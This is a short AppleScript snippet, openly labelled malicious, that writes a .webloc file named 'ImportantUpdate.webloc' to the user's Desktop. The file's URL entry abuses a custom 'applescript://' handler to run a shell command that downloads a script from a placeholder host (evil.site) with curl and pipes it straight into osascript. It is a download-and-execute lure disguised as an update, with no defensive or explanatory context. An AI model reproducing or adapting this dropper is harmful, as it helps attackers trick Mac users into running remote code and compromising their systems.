-- Create a .webloc file that runs a malicious AppleScript via custom URL handler
set weblocText to "<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist version=\"1.0\"><dict><key>URL</key><string>applescript://run?do+shell+script+%22curl+http://evil.site/payload.scpt+|+osascript%22</string></dict></plist>"

-- Write to user Desktop
do shell script "echo " & quoted form of weblocText & " > ~/Desktop/ImportantUpdate.webloc"
